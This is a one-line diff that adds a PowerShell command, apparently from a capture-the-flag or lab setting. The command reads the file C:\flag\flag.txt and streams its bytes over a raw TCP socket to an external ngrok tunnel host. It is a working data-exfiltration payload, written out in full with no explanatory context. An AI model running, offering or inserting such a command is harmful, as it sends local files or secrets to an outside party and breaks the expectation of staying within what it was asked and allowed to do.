@@ -1,0 +1,1 @@
+powershell Invoke-Expression "(New-Object Net.Sockets.TcpClient('0.tcp.eu.ngrok.io', 14638)).GetStream().Write((Get-Content 'C:\flag\flag.txt' -Encoding Byte), 0, (Get-Content 'C:\flag\flag.txt' -Encoding Byte).Length)"
